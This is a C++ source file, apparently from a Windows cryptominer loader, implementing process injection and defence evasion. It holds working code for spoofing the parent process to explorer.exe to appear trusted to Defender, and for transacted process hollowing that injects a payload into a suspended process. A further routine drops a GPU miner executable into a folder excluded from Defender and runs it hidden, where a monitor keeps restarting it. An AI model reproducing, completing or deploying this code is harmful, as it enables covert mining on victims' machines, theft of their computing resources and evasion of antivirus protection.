#include <windows.h>
#include <tlhelp32.h>

#include <iostream>
#include <stdio.h>
#include <map>
#include <mutex>


#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"
#include "../include/encryption.h"

#include "../include/process_info.h"
#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"


bool create_new_process_internal(PROCESS_INFORMATION &pi, LPWSTR targetPath, LPWSTR args = NULL, LPWSTR startDir = NULL)
{
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    wchar_t cmdLine[MAX_PATH * 2] = {0};
    if (args != NULL && args[0] != L'\0') {
        swprintf_s(cmdLine, L"\"%s\" %s", targetPath, args);
    } else {
        swprintf_s(cmdLine, L"\"%s\"", targetPath);
    }

    // ── PPID spoofing: inherit parent PID from explorer.exe ──────────────
    // Defender's PsSetCreateProcessNotifyRoutineEx callback checks the parent;
    // processes created under explorer.exe are treated as trusted.
    HANDLE hParent = NULL;
    DWORD explorerPid = 0;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = {};
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                    explorerPid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (explorerPid) {
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
    }

    SIZE_T attrListSize = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = nullptr;
    bool useAttr = (hParent != NULL);

    if (useAttr) {
        InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);
        pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
        if (pAttrList) {
            if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrListSize) ||
                !UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParent, sizeof(hParent), nullptr, nullptr)) {
                HeapFree(GetProcessHeap(), 0, pAttrList);
                pAttrList = nullptr;
                useAttr = false;
            }
        } else {
            useAttr = false;
        }
    }

    STARTUPINFOEXW siex = {};
    siex.StartupInfo.cb  = useAttr ? sizeof(STARTUPINFOEXW) : sizeof(STARTUPINFOW);
    siex.lpAttributeList = useAttr ? pAttrList : nullptr;

    DWORD flags = CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW;
    if (useAttr) flags |= EXTENDED_STARTUPINFO_PRESENT;

    BOOL ok = CreateProcessW(
        nullptr,
        cmdLine,
        nullptr, nullptr,
        FALSE,
        flags,
        nullptr,
        startDir,
        (LPSTARTUPINFOW)&siex,
        &pi
    );

    if (pAttrList) { DeleteProcThreadAttributeList(pAttrList); HeapFree(GetProcessHeap(), 0, pAttrList); }
    if (hParent)   { CloseHandle(hParent); }

    if (!ok) {
        printf("[ERROR] CreateProcessW (PPID spoof) failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
        }
        else {
            std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
            return NULL;
        }
    }
    
    std::cout << "Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
    std::cout << "View Size:\t" << std::hex << viewSize << "\n";
    
    // After mapping, add a small delay to ensure the mapping is fully committed
    Sleep(20);
    
    // Flush the process' working set to ensure pages are present
    // This helps prevent page faults during early execution
    if (!FlushViewOfFile(sectionBaseAddress, viewSize)) {
        std::cerr << "[WARNING] Failed to flush view of file, but continuing...\n";
    }
    
    return sectionBaseAddress;
}

namespace {

// Releases a hollow process that failed to launch: kills it (it would otherwise
// stay alive and suspended), closes the primary handles and drops the
// ProcessStorage entry. Previously each failure leaked the suspended process
// and two kernel handles.
void abandon_hollow_process(PROCESS_INFORMATION& pi) {
    if (pi.hProcess) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        pi.hProcess = NULL;
    }
    if (pi.hThread) {
        CloseHandle(pi.hThread);
        pi.hThread = NULL;
    }
    if (pi.dwProcessId) {
        ProcessStorage::RemoveProcess(pi.dwProcessId);
    }
    pi.dwProcessId  = 0;
    pi.dwThreadId   = 0;
}

} // namespace

// Writes the GPU miner payload to disk (inside the Defender-excluded folder)
// and launches it as a normal process instead of hollowing it. The PID is
// registered in ProcessStorage so the monitor loop keeps restarting and
// suspending/resuming it exactly like an injected miner.
DWORD drop_payload_and_run(const wchar_t* exePath, BYTE* payload, DWORD payloadSize, LPWSTR args)
{
    // 1) Drop the payload to disk.
    HANDLE hFile = CreateFileW(exePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[ERROR] Failed to create GPU miner file, Error = " << GetLastError() << "\n";
        return 0;
    }
    DWORD written = 0;
    BOOL ok = WriteFile(hFile, payload, payloadSize, &written, NULL);
    CloseHandle(hFile);
    if (!ok || written != payloadSize) {
        std::cerr << "[ERROR] Failed to write GPU miner file\n";
        return 0;
    }

    // 2) Build the command line.
    wchar_t cmdLine[MAX_PATH * 2] = {0};
    if (args != NULL && args[0] != L'\0') {
        swprintf_s(cmdLine, L"\"%s\" %s", exePath, args);
    } else {
        swprintf_s(cmdLine, L"\"%s\"", exePath);
    }

    // 3) PPID spoof to explorer.exe (mirrors create_new_process_internal).
    HANDLE hParent = NULL;
    DWORD explorerPid = 0;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = {};
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                    explorerPid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (explorerPid) {
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
    }

    SIZE_T attrListSize = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = nullptr;
    bool useAttr = (hParent != NULL);

    if (useAttr) {
        InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);
        pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
        if (pAttrList) {
            if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrListSize) ||
                !UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParent, sizeof(hParent), nullptr, nullptr)) {
                HeapFree(GetProcessHeap(), 0, pAttrList);
                pAttrList = nullptr;
                useAttr = false;
            }
        } else {
            useAttr = false;
        }
    }

    STARTUPINFOEXW siex = {};
    siex.StartupInfo.cb  = useAttr ? sizeof(STARTUPINFOEXW) : sizeof(STARTUPINFOW);
    siex.lpAttributeList = useAttr ? pAttrList : nullptr;

    DWORD flags = DETACHED_PROCESS | CREATE_NO_WINDOW;
    if (useAttr) flags |= EXTENDED_STARTUPINFO_PRESENT;

    PROCESS_INFORMATION pi = { 0 };
    BOOL created = CreateProcessW(
        nullptr,
        cmdLine,
        nullptr, nullptr,
        FALSE,
        flags,
        nullptr, nullptr,
        (LPSTARTUPINFOW)&siex,
        &pi
    );

    if (pAttrList) { DeleteProcThreadAttributeList(pAttrList); HeapFree(GetProcessHeap(), 0, pAttrList); }
    if (hParent)   { CloseHandle(hParent); }

    if (!created) {
        std::cerr << "[ERROR] CreateProcessW (GPU miner) failed, Error = " << GetLastError() << "\n";
        return 0;
    }

    ProcessStorage::AddProcess(pi.dwProcessId, pi);
    std::cout << "Launched GPU miner from disk, PID: " << std::dec << pi.dwProcessId << "\n";
    return pi.dwProcessId;
}

DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize, LPWSTR args)
{
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);


    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        std::cout << "Creating transacted section has failed!\n";
        return false;
    }
    wchar_t *start_dir = NULL;
    wchar_t dir_path[MAX_PATH] = { 0 };
    get_directory(targetPath, dir_path, NULL);
    if (wcsnlen(dir_path, MAX_PATH) > 0) {
        start_dir = dir_path;
    }
    PROCESS_INFORMATION pi = { 0 };
    if (!create_new_process_internal(pi, targetPath, args, start_dir)) {
        std::cerr << "Creating process failed!\n";
        CloseHandle(hSection);
        return false;
    }

    ProcessStorage::AddProcess(pi.dwProcessId, pi);
    std::cout << "Created Process, PID: " << std::dec << pi.dwProcessId << "\n";
    HANDLE hProcess = pi.hProcess;

    // Assign the hollow process to a Job Object with ActiveProcessLimit=1 so the
    // injected payload cannot spawn child processes (prevents double-notepad.exe).
    HANDLE hJob = CreateJobObjectW(NULL, NULL);
    if (hJob) {
        JOBOBJECT_BASIC_LIMIT_INFORMATION jobLimits = {};
        jobLimits.LimitFlags        = JOB_OBJECT_LIMIT_ACTIVE_PROCESS;
        jobLimits.ActiveProcessLimit = 1;
        SetInformationJobObject(hJob, JobObjectBasicLimitInformation, &jobLimits, sizeof(jobLimits));
        if (!AssignProcessToJobObject(hJob, hProcess)) {
            std::cerr << "[WARNING] Failed to assign process to job object: " << GetLastError() << "\n";
        }
        CloseHandle(hJob); // Job stays active until the process exits
    }

    PVOID remote_base = map_buffer_into_process(hProcess, hSection);

    // The section object is only needed to create the remote view: closing it
    // here (the view keeps its own reference) stops leaking one kernel section
    // handle per injection, which is what slowly degraded the whole system.
    CloseHandle(hSection);
    hSection = NULL;

    if (!remote_base) {
        std::cerr << "Failed mapping the buffer!\n";
        abandon_hollow_process(pi);
        return false;
    }
    bool isPayl32b = !pe_is64bit(payladBuf);
    if (!redirect_to_payload(payladBuf, remote_base, pi, isPayl32b)) {
        std::cerr << "Failed to redirect!\n";
        abandon_hollow_process(pi);
        return false;
    }
    
    std::cout << "Redirected entry point, waiting for initialization...\n";
    
    // Critical: Add delay to ensure the injected code is fully initialized
    // The system needs time to:
    // 1. Flush any outstanding memory writes
    // 2. Update TLB entries
    // 3. Prepare the injected thread for execution
    Sleep(100);  // 100ms delay for system stabilization
    
    // Flush instruction cache to ensure the CPU sees the new code
    FlushInstructionCache(pi.hProcess, remote_base, payloadSize);
    
    // Add another small delay after cache flush
    Sleep(50);
    
    std::cout << "Resuming thread, PID " << std::dec << pi.dwProcessId << std::endl;
    
    // Resume the thread and let the payload run
    if (!ResumeThread(pi.hThread)) {
        std::cerr << "Failed to resume thread! Error: " << GetLastError() << "\n";
        // Clean up on failure
        abandon_hollow_process(pi);
        return false;
    }
    
    std::cout << "Thread resumed successfully, payload executing...\n";
    return pi.dwProcessId;
}
